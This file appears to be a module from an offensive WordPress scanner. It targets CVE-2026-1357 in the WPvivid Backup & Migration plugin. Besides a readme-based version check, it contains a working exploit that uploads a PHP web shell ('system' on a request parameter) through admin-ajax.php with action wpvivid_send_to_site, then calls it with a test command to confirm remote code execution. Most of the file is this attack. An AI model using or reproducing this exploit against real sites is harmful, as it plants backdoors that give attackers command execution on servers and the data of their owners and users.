# Made by Sn0w8ird

from __future__ import annotations

import random
from typing import Any, Dict

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20261357WPvivid(WordPressModule):
    """WPvivid Backup & Migration — remote version check vs fixed metadata."""

    name = "CVE-2026-1357"
    severity = 9.8
    affected_versions = ["<=0.9.123 per research inventory — confirm against vendor SA"]
    cwe = "CWE-434 / CWE-22 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/wpvivid-backuprestore/readme.txt",
        "/wp-content/plugins/wpvivid-backup-main/readme.txt",
    )
    slug_hint = "wpvivid"
    fixed_in_version = "0.9.124"

    async def exploit_remote_primitive(
        self,
        client: CPointedClient,
        wp_path: str,
        *,
        target: Target,
        timeout: float,
    ) -> Dict[str, Any]:
        """
        Multipart POST ``action=wpvivid_send_to_site`` + ``backup_file`` (verify via uploads GET).
        """
        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
        webshell_name = f"cpointed_{random.randint(1000, 9999)}.php"
        webshell_content = "<?php system($_GET['c'] ?? $_POST['c']); ?>"
        files = {"backup_file": (webshell_name, webshell_content, "application/octet-stream")}
        data = {"action": "wpvivid_send_to_site"}
        try:
            response = await client.post(ajax, data=data, files=files, timeout=timeout)
        except Exception as exc:  # pragma: no cover - network
            return {
                "webshell_url": None,
                "upload_response_code": None,
                "verify_response": str(exc),
                "success": False,
            }
        test_path = self._path_for_wp(wp_path, f"/wp-content/uploads/{webshell_name}")
        try:
            verify_resp = await client.get(test_path, params={"c": "echo TEST"}, timeout=timeout)
            body = verify_resp.text or ""
            ok = verify_resp.status_code == 200 and "TEST" in body
        except Exception as exc:  # pragma: no cover - network
            verify_resp = None
            body = str(exc)
            ok = False
        return {
            "webshell_name": webshell_name,
            "webshell_url_path": test_path,
            "upload_response_code": response.status_code,
            "upload_body_snippet": (response.text or "")[:2000],
            "verify_status_code": getattr(verify_resp, "status_code", None),
            "verify_response": body[:200],
            "success": ok,
        }

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
